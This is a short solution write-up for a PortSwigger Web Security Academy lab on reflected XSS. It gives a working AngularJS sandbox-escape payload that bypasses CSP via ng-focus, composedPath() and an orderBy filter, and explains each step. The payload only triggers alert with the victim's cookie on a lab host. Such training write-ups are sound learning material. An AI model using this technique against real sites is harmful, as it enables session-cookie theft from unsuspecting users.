# Lab 29 — Reflected XSS with AngularJS sandbox escape and CSP

> **Expert** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

**Entry point:** AngularJS expressions + CSP + sandbox; the escape must run
in window scope without `window` literals.

## Solution

Deliver from the exploit server:

```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

- `ng-focus` + `#x` auto-focus fires the expression.
- `$event.composedPath()` (Chrome) ends with the `window` object.
- `| orderBy:'(z=alert)(document.cookie)'` assigns `alert` to `z` and calls
  it **when the iteration reaches window** — so the call happens in window
  scope, bypassing both the sandbox's window check and CSP.

Lab solved when the victim's alert fires with the cookie.
